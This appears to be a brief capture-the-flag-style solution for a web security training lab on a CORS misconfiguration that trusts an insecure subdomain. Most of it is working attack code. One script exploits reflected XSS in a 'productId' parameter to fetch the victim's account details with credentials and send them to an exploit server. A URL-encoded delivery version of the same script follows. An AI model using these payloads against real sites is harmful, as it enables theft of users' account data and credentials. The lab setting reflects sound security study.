# CORS vulnerability with trusted insecure protocols

```html
First - we have to discover XSS. By enumeration, we can find it in the `productId` get param when checking the stock on the website. From here - we have to make a script that requests the account details and exfiltrates it using a log. I first wrote this script to request and exfiltrate the dat:
```html
<script>
    var r = new XMLHttpRequest();
    r.onload = reqListener;
    r.open('get', 'https://0ae400c1044d68fa80de8f54004a0016.web-security-academy.net/accountDetails', true);
    r.withCredentials = true;
    r.send();

    function reqListener() {
        window.location = ('http://exploit-0aad005e04ed68aa80ab8e34017900ad.exploit-server.net/exploit?log=' + this.responseText);
    };
</script>
```
This then had to be url encoded and placed into the XSS param. This ended up with a this script that I could deliver to the victim:
```html
<script>
window.location = "http://stock.0ae400c1044d68fa80de8f54004a0016.web-security-academy.net/?productId=%3Cscript%3Evar%20r%3Dnew%20XMLHttpRequest()%3Br.onload%20%3D%20reqListener%3Br.open('get'%2C'https%3A%2F%2F0ae400c1044d68fa80de8f54004a0016.web-security-academy.net%2FaccountDetails'%2Ctrue)%3Br.withCredentials%3Dtrue%3Br.send()%3Bfunction%20reqListener()%7Bwindow.location%3D%20'http%3A%2F%2Fexploit-0aad005e04ed68aa80ab8e34017900ad.exploit-server.net%2Fexploit%3Flog%3D'%2Bthis.responseText%3B%7D%3B%3C%2Fscript%3E&storeId=1"
</script>
```